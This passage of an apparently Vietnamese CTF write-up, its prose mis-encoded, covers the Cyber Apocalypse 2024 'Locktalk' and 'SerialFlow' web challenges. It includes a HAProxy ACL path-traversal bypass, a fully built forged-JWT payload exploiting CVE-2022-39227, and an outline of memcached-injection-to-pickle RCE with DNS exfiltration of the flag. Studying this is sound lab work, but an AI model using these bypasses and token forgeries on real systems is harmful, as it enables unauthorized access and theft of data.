<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    claims <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">,</span></span>
<span class="line">        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    </span>
<span class="line"><span class="token decorator annotation punctuation">@api_blueprint<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/flag&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token decorator annotation punctuation">@authorize_roles</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;administrator&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ƒê·ªÉ l·∫•y ƒë∆∞·ª£c flag th√¨ y√™u c·∫ßu jwt token ph·∫£i c√≥ role l√† <code>administrators</code>, tuy nhi√™n token ƒë∆∞·ª£c generate ra t·ª´ <code>/get_ticket</code> l√† <code>guest</code>. V·∫≠y ph·∫£i faki jwt ƒë·ªÉ l·∫•y ƒë∆∞·ª£c flag.</p><p>Tuy nhi√™n, khi GET <code>/api/v1/get_ticket</code> l·∫°i b·ªã <strong>403 Forbidden</strong>, ban ƒë·∫ßu m√¨nh kh√¥ng ƒë·ªçc kƒ© n√™n kh√¥ng ƒë·ªÉ √Ω app s·ª≠ d·ª•ng haproxy. Ng√≥ qua config c·ªßa haproxy th√¨ th·∫•y nh∆∞ sau</p><div class="language-config line-numbers-mode" data-highlighter="prismjs" data-ext="config" data-title="config"><pre><code><span class="line">frontend haproxy</span>
<span class="line">    bind 0.0.0.0:1337</span>
<span class="line">    default_backend backend</span>
<span class="line"></span>
<span class="line">    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>khi GET ƒë·∫øn th√¨ s·∫Ω b·ªã proxy ch·∫∑n l·∫°i, ACL ki·ªÉm tra n·∫øu url b·∫Øt ƒë·∫ßu v·ªõi <code>/api/v1/get_ticket</code> th√¨ ch·∫∑n l·∫°i, ta c√≥ th·ªÉ bypass b·∫±ng c√°ch GET <code>/api/v1/../v1/get_ticket</code>.</p><blockquote><p>Ngo√†i ra c√≥ th·ªÉ bypass v·ªõi <code>//api/v1/get_ticket</code> (shin24)</p><p>Ho·∫∑c d·ª±a v√†o haproxy version hi·ªán t·∫°i l√† 2.8.1, b·ªã d√≠nh l·ªó h·ªïng b·∫£o m·∫≠t <a href="https://www.cvedetails.com/cve/CVE-2023-45539/" target="_blank" rel="noopener noreferrer">CVE-2023-45539<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p><img src="/assets/cyber-apocalypse-2024-2-CvynAyV4.png" alt="image"> ƒê√£ c√≥ jwt v·ªõi role l√† <code>guest</code>, ta c·∫ßn t√¨m c√°ch edit jwt ƒë·ªÉ c√≥ th·ªÉ ch·ªânh th√†nh <code>admin</code>. M√† ·ªü ƒë√¢y app s·ª≠ d·ª•ng <a href="https://pypi.org/project/python-jwt/" target="_blank" rel="noopener noreferrer">python-jwt v3.3.3<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> ƒë·ªÉ x·ª≠ l√Ω jwt. ƒê√¢y c≈©ng l√† m·ªôt phi√™n b·∫£n c≈© v√† b·ªã d√≠nh l·ªó h·ªïng b·∫£o m·∫≠t <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39227" target="_blank" rel="noopener noreferrer">CVE-2022-39227<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> cho ph√©p ta ch·ªânh s·ª≠a, gi·∫£ m·∫°o jwt m·ªõi v·ªõi sign c≈©.</p><p>ƒê·∫øn ƒë√¢y ta ch·ªâ c·∫ßn d·ª±a v√†o CVE-2022-39227 ch·ªânh s·ª≠a jwt token t·ª´ role <code>guest</code> th√†nh <code>administrators</code> v√† GET <code>/api/v1/flag</code> v·ªõi jwt token ƒë·ªÉ l·∫•y flag.</p><h3 id="ve-cve-2022-39227" tabindex="-1"><a class="header-anchor" href="#ve-cve-2022-39227"><span>V·ªÅ CVE-2022-39227</span></a></h3><p><code>python-jwt</code> sau ƒë√≥ ƒë√£ c·∫≠p nh·∫≠t l√™n v3.3.4 ƒë·ªÉ fix l·ªói (<a href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9" target="_blank" rel="noopener noreferrer">#88ad9e6<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>), c·ª• th·ªÉ th√™m h√†m ƒë·ªÉ check jwt format <img src="/assets/cyber-apocalypse-2024-3-CW-PpPkM.png" alt="image"> ·ªû phi√™n b·∫£n c≈©, ta c√≥ th·ªÉ ƒë∆∞a v√†o JSON string thay v√¨ JWT string format, d·∫´n ƒë·∫øn vi·ªác gi·∫£ m·∫°o d·ªØ li·ªáu m√† v·∫´n c√≥ th·ªÉ verify th√†nh c√¥ng.</p><p>Khi GET <code>/api/v1/flag</code> c√πng jwt, app s·∫Ω g·ªçi h√†m verify jwt ƒë∆∞·ª£c truy·ªÅn v√†o</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">verify_jwt</span><span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> <span class="token comment">#jwt</span></span>
<span class="line">               pub_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token comment">#current_app.config.get(&#39;JWT_SECRET_KEY&#39;)</span></span>
<span class="line">               allowed_algs<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token comment"># [&#39;PS256&#39;]</span></span>
<span class="line">               iat_skew<span class="token operator">=</span>timedelta<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span>
<span class="line">               checks_optional<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span></span>
<span class="line">               ignore_not_implemented<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    header<span class="token punctuation">,</span> claims<span class="token punctuation">,</span> _ <span class="token operator">=</span> jwt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    parsed_header <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    <span class="token keyword">if</span> pub_key<span class="token punctuation">:</span></span>
<span class="line">        token <span class="token operator">=</span> JWS<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">        token<span class="token punctuation">.</span>allowed_algs <span class="token operator">=</span> allowed_algs</span>
<span class="line">        token<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> pub_key<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">elif</span> <span class="token string">&#39;none&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> allowed_algs<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">&#39;no key but none alg not allowed&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">    parsed_claims <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>claims<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">    <span class="token keyword">return</span> parsed_header<span class="token punctuation">,</span> parsed_claims</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Code t√°ch jwt ƒë∆∞·ª£c truy·ªÅn v√†o theo k√≠ t·ª± <code>.</code> th√†nh 3 ph·∫ßn. V·ªõi ph·∫ßn t·ª≠ ƒë·∫ßu ti√™n l√† <code>header</code>, th·ª© hai l√† <code>claims</code> (payload) v√† signature kh√¥ng s·ª≠ d·ª•ng ƒë·∫øn. Sau ƒë√≥ g·ªçi <code>token.deserialize</code> ƒë·ªÉ deserialize jwt, n·∫øu c√≥ l·ªói g√¨ v·ªõi jwt th√¨ raise error, ng∆∞·ª£c l·∫°i th√¨ tr·∫£ v·ªÅ 2 dict ƒë∆∞·ª£c loads sau khi decode base64.</p><p>Trace v√†o h√†m <code>deserialize</code>, ta th·∫•y <code>raw_jws</code> ban ƒë·∫ßu ƒë∆∞·ª£c xem l√† JSON string, app c·ªë g·∫Øng ƒë·ªÉ loads JSON t·ª´ <code>raw_jns</code>. N·∫øu kh√¥ng ƒë∆∞·ª£c th√¨ m·ªõi xem ƒë√≥ l√† JWT format v√† split theo k√≠ t·ª± <code>.</code> N·∫øu ƒë∆∞a v√†o JWT ƒë√£ b·ªã thay ƒë·ªïi theo jwt format th√¨ s·∫Ω verify th·∫•t b·∫°i, ta c·∫ßn th·ª≠ ƒë∆∞a v√†o jwt d∆∞·ªõi d·∫°ng JSON string.</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line">    <span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_jws<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> alg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">        <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">                djws <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>raw_jws<span class="token punctuation">)</span></span>
<span class="line">                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">            <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span></span>
<span class="line">                data <span class="token operator">=</span> raw_jws<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span></span>
<span class="line">                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># pylint: disable=broad-except</span></span>
<span class="line">            <span class="token keyword">raise</span> InvalidJWSObject<span class="token punctuation">(</span><span class="token string">&#39;Invalid format&#39;</span><span class="token punctuation">)</span> <span class="token keyword">from</span> e</span>
<span class="line"></span>
<span class="line">        <span class="token keyword">if</span> key<span class="token punctuation">:</span></span>
<span class="line">            self<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>key<span class="token punctuation">,</span> alg<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>T·∫≠p trung v√†o tr∆∞·ªùng h·ª£p <code>json_decode</code> th√†nh c√¥ng. Code s·∫Ω l·∫•y payload (claims), signature, protected (header) t·ª´ <code>djws</code> v√† ti·∫øn h√†nh verify. <img src="/assets/cyber-apocalypse-2024-4-DwCDJrSM.png" alt="image"> Ta c·∫ßn ƒë∆∞a v√†o jwt th·ªèa m√£n:</p><ul><li>L√† d·∫°ng JSON string</li><li>Sau khi split k√≠ t·ª± &#39;.&#39; chia ra 3 ph·∫ßn: header, payload v√† _ (KH√îNG QUAN TR·ªåNG üí£üí•üí•)</li></ul><p>V√¨ h√†m <code>verify_jwt</code> ch·ªâ return v·ªÅ 2 ph·∫ßn ƒë·∫ßu, v√† h√†m <code>desrialize</code> d·ª±a v√†o dict keys (protected, payload, signature,...) ƒë·ªÉ d·ª±ng l·∫°i jwt token v√† verify --&gt; C√≥ th·ªÉ fake 2 ph·∫ßn ƒë·∫ßu l√† 2 ph·∫ßn ƒë√£ b·ªã thay ƒë·ªïi, v√† jwt token ƒë∆∞·ª£c verify l√† jwt token c≈©.</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>
<span class="line">  <span class="token property">&quot;header.new_payload.hehe&quot;</span><span class="token operator">:</span><span class="token string">&quot;huhu&quot;</span><span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;protected&quot;</span><span class="token operator">:</span> header<span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;payload&quot;</span><span class="token operator">:</span> original_payload<span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;signature&quot;</span><span class="token operator">:</span> signature</span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>T·ª´ payload n√†y, C√≥ th·ªÉ th·∫•y jwt ƒë∆∞a v√†o <code>app/v1/flag</code> th·ªèa m√£n c·∫£ hai ƒëi·ªÅu ki·ªán tr√™n.</p><p>C·ª• th·ªÉ v·ªõi jwt l√†</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>S·∫Ω th√†nh</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>
<span class="line">  <span class="token property">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzEwOTk0ODEwLCAiaWF0IjogMTcxMDk5MTIxMCwgImp0aSI6ICIyS3U2Q3lxRmstN2NJcGxXUUM3NXNnIiwgIm5iZiI6IDE3MTA5OTEyMTAsICJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0.hehe&quot;</span><span class="token operator">:</span> <span class="token string">&quot;huhu&quot;</span><span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;protected&quot;</span><span class="token operator">:</span><span class="token string">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;payload&quot;</span><span class="token operator">:</span><span class="token string">&quot;eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ&quot;</span><span class="token punctuation">,</span></span>
<span class="line">  <span class="token property">&quot;signature&quot;</span><span class="token operator">:</span><span class="token string">&quot;TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q&quot;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Sau khi split, header s·∫Ω l√† <code>{&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9</code> nh∆∞ng v·∫´n c√≥ th·ªÉ decode v√† loads th√†nh c√¥ng <img src="/assets/cyber-apocalypse-2024-5-Bj3Xsn3s.png" alt="image"></p><p>Sau ƒë√≥ jwt ƒë∆∞·ª£c deserilize v√† verify <img src="/assets/cyber-apocalypse-2024-6-CoDZxcYh.png" alt="image"> Cu·ªëi c√πng jwt ƒë∆∞·ª£c verify qua JWSCore, v√¨ param <code>header</code> ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ <code>protected</code> n√™n khi t·∫°o JSONG string, m√¨nh ph·∫£i d√πng <code>protected</code>. <img src="/assets/cyber-apocalypse-2024-7-BVDZa7Sh.png" alt="image"></p><hr><p>B√†i vi·∫øt tham kh·∫£o th√™m t·ª´ <a href="https://github.com/user0x1337/CVE-2022-39227" target="_blank" rel="noopener noreferrer">@user0x1337/CVE-2022-39227<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h2 id="web-serialflow" tabindex="-1"><a class="header-anchor" href="#web-serialflow"><span>WEB: SerialFlow</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP&#39;s external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?</p><p><a href="#"><code>üìÅ web_serialflow.zip</code></a></p></div><p>Khi v√†o web ta s·∫Ω th·∫•y m·ªôt giao di·ªán kh√° ng·∫ßu <img src="/assets/cyber-apocalypse-2024-8-CtSI7DyC.png" alt="alt text"> Ta c√≥ th·ªÉ ch·ªânh s·ª≠a m√†u c·ªßa text khi GET <code>/set?uicolor=(color)</code> v·ªõi color l√† m√†u t√πy ch·ªânh. Ng√≥ qua <code>requirements.txt</code> c√≥ th·ªÉ th·∫•y code s·ª≠ d·ª•ng Flask, Flask-Session v√† pylibmc (memcached)</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Flask==2.2.2</span>
<span class="line">Flask-Session==0.4.0</span>
<span class="line">pylibmc==1.6.3</span>
<span class="line">Werkzeug==2.2.2</span>
<span class="line">debugpy</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Code s·ª≠ d·ª•ng memcache l√†m cache server ƒë·ªÉ l∆∞u data. C√≥ m·ªôt <a href="https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/" target="_blank" rel="noopener noreferrer">blog<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> kh√° th√∫ v·ªã n√≥i v·ªÅ memcached injection to RCE d·ª±a v√†o Pickle deserialize (unpickle).</p><p>Pickle s·∫Ω load val t·ª´ memcached server, v·ªõi <code>full_session_key</code> c√≥ sid l√† m√¨nh c√≥ th·ªÉ t√πy ch·ªânh <img src="/assets/cyber-apocalypse-2024-9-BCNVD9hV.png" alt="alt text"> Theo blog th√¨ ta c√≥ th·ªÉ s·ª≠ d·ª•ng memcached injection ƒë·ªÉ th√™m v√†o memcached server data c·ªßa m√¨nh.</p><p><img src="/assets/cyber-apocalypse-2024-10-CixWgyLZ.png" alt="alt text"> Khi ƒë∆∞a v√†o cookie v√† reload page, nh·ªù memcache injection, ta ƒë√£ ƒë∆∞a v√†o d·ªØ li·ªáu c·ªßa m√¨nh nh∆∞ sau <img src="/assets/cyber-apocalypse-2024-11-D-_ZIcMM.png" alt="alt text"> Khi pickle loads <code>hehe</code>, h√†m <code>os.system</code> s·∫Ω ƒë∆∞·ª£c ch·∫°y v√† t·∫°o m·ªôt file <code>huhu.txt</code> ·ªü temp folders. Nh∆∞ v·∫≠y l√† RCE th√†nh c√¥ng, t·ª´ ƒë√¢y ta c√≥ th·ªÉ ƒë·ªçc file flag v√† send ƒë·∫øn server c·ªßa m√¨nh qua dns v·ªõi l·ªánh <code>nslookup</code>.</p><h1 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h1><p><s><em>Update later</em></s></p></div></div><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Last Updated 12/16/2024, 9:07:24 AM<!--]--></span></span></div></footer><!----><!----></div><div class="page-catalog-container"><h5 class="tip">ON THIS PAGE</h5><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/cyber-apocalypse-2024.html#web-testimonial" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="WEB: testimonial"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->WEB: testimonial<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/cyber-apocalypse-2024.html#web-locktalk" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="WEB: Locktalk"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->WEB: Locktalk<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/cyber-apocalypse-2024.html#ve-cve-2022-39227" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="V·ªÅ CVE-2022-39227"><!--[--><!--]--><span class="xicon-container 